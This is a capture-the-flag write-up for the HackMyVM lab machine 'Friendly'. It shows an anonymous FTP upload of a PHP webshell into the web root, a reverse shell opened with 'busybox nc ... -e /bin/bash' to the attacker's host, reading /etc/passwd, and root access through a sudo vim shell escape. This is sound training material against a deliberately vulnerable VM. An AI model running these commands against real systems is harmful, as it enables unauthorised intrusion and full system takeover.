# Friendly

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Friendly | RiJaba1 | Beginner | HackMyVM |

**Summary:** The Friendly machine presents a classic but instructive attack surface rooted in a misconfigured FTP service. Anonymous FTP login is permitted, and crucially, the FTP root directory is mapped directly to the Apache web root at `/var/www/html`. This meant that any file uploaded via FTP would be immediately accessible and executable through the HTTP server. By crafting a minimal PHP webshell and uploading it over the anonymous FTP session, it became possible to achieve remote code execution as `www-data`. From there, a reverse shell was established using `busybox nc`, turning the one-liner command execution into a fully interactive session. Post-exploitation enumeration of `sudo` privileges revealed a critical misconfiguration: `www-data` was permitted to execute `/usr/bin/vim` as any user with no password required. Vim's built-in shell escape feature was leveraged to break out of the editor into a full root shell, granting complete system compromise. A final twist rewarded careful enumeration: the root flag was not located in `/root/root.txt` as expected, but had been deliberately hidden at `/var/log/apache2/root.txt`, requiring an explicit filesystem search to retrieve it.

---

## Reconnaissance

The engagement began with host discovery across the local virtual network segment to identify the target machine.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.155 08:00:27:A2:9F:C0 VirtualBox
```

The target was identified at `192.168.100.155`. A full port scan with service and version detection was then run against it.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 07:12 WIB
Nmap scan report for 192.168.100.155
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Debian Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 238.96 seconds
```

Nmap revealed exactly two open ports: port 21 running ProFTPD and port 80 running Apache 2.4.54 on Debian. The HTTP server responded with the default Apache landing page, which was confirmed by a direct `curl` request.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ curl $ip

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
...
<!--   --- __  ---   -->
```

With no immediately obvious web application to attack, attention shifted to the FTP service.

---

## Initial Access

### FTP Anonymous Login and Web Root Write Access

Attempting an anonymous login to the FTP service succeeded immediately, granting access without a real password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ ftp $ip
Connected to 192.168.100.155.
220 ProFTPD Server (friendly) [::ffff:192.168.100.155]
Name (192.168.100.155:ouba): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||40656|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||53978|)
150 Opening BINARY mode data connection for index.html (10725 bytes)
100% |**********************| 10725        2.31 MiB/s    00:00 ETA
226 Transfer complete
10725 bytes received in 00:00 (1.38 MiB/s)
```

Downloading `index.html` and inspecting its contents confirmed that it was identical to the page served by Apache on port 80. This was the critical discovery: the FTP directory was the web root itself. Furthermore, the directory permissions were set to `drwxrwxrwx`, meaning it was world-writable. Any file uploaded here would be instantly served by the web server.

### PHP Webshell Upload and Remote Code Execution

A minimal PHP webshell was crafted to accept a `cmd` GET parameter and execute it on the server. The payload used is shown below.

![](image.png)

The shell was uploaded via the authenticated FTP session.

```bash
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||55849|)
150 Opening BINARY mode data connection for shell.php
100% |**********************|    31      260.97 KiB/s    00:00 ETA
226 Transfer complete
31 bytes sent in 00:00 (10.25 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||49275|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 10 00:24 .
drwxrwxrwx   2 root     root         4096 Mar 10 00:24 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup        31 Mar 10 00:24 shell.php
226 Transfer complete
```

`shell.php` was confirmed present in the FTP directory. Remote code execution was immediately validated by requesting the file through HTTP with a test command.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ curl "http://192.168.100.155/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The server responded with `uid=33(www-data)`, confirming successful RCE under the web server process identity.

### Reverse Shell Establishment

A `netcat` listener was opened locally, and the webshell was used to invoke `busybox nc` on the target to call back.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly]
└─$ curl "http://192.168.100.155/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20/bin/bash"
```

The connection was established. A PTY was then spawned using Python to upgrade the shell to a fully interactive terminal.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 52138
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@friendly:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444
```

A stable shell was now available as `www-data` on the Friendly machine.

---

## Post-Exploitation Enumeration

### User Discovery

A quick inspection of `/etc/passwd` revealed the local user accounts with interactive shells.

```bash
www-data@friendly:/var/www$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
RiJaba1:x:1000:1000::/home/RiJaba1:/bin/bash
```

Two accounts had bash shells: `root` and `RiJaba1`. The user flag was recovered from `RiJaba1`'s home directory during the privilege escalation phase.

---

## Privilege Escalation

### Sudo Misconfiguration via Vim

Checking the `sudo` privileges available to `www-data` revealed an immediately exploitable misconfiguration.

```bash
www-data@friendly:/var/www$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
www-data@friendly:/var/www$ ls -la /usr/bin/vim
lrwxrwxrwx 1 root root 21 Feb 21  2023 /usr/bin/vim -> /etc/alternatives/vim
```

The `www-data` user could run `/usr/bin/vim` as `ALL` with no password. Vim supports a built-in command execution feature via its `:!` shell escape, making this a trivial privilege escalation. Vim was launched with `sudo` and a shell was spawned directly from within it.

```bash
www-data@friendly:/var/www$ sudo /usr/bin/vim -c ':!/bin/bash'

root@friendly:/var/www# cd
root@friendly:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
friendly
```

A root shell was obtained. The `-c ':!/bin/bash'` flag instructed Vim to immediately execute `/bin/bash` as a shell command upon startup, bypassing the need to interact with the editor at all.

### Flag Retrieval

With root access secured, both flags were read. The user flag resided at its expected path, but the root flag returned a decoy message.

```bash
root@friendly:~# cat /home/RiJaba1/user.txt /root/root.txt
b8c[REDACTED]
Not yet! Find root.txt.
```

The content of `/root/root.txt` was a hint, not the actual flag. A recursive filesystem search for any file named `root.txt` revealed the true location.

```bash
root@friendly:~# find / -type f -name "*root.txt*" 2>/dev/null
/var/log/apache2/root.txt
/root/root.txt
root@friendly:~# cat /var/log/apache2/root.txt
66b[REDACTED]
```

The real root flag had been hidden inside the Apache log directory at `/var/log/apache2/root.txt`.

---

## Attack Chain Summary

1. **Reconnaissance**: An Nmap full-port scan identified two services on the target: ProFTPD on port 21 and Apache 2.4.54 on port 80. The HTTP server served only the default Debian Apache page.

2. **Vulnerability Discovery**: Anonymous FTP login was permitted, and the FTP working directory was found to be world-writable. Downloading the `index.html` file confirmed it was the exact file served by Apache, proving the FTP root and the web root were the same directory.

3. **Exploitation**: A single-line PHP webshell was uploaded to the FTP server. It was then requested over HTTP to confirm RCE as `www-data`. A reverse shell was triggered using `busybox nc` through the webshell's command parameter.

4. **Internal Enumeration**: The `/etc/passwd` file revealed `RiJaba1` as the standard user. Checking `sudo -l` for `www-data` exposed an unrestricted, passwordless sudo permission on `/usr/bin/vim`.

5. **Privilege Escalation**: Vim's built-in shell escape (`:!`) was used alongside `sudo` to spawn a root shell directly. The root flag required an additional `find` search, as it was deliberately placed at `/var/log/apache2/root.txt` rather than the obvious `/root/root.txt`.
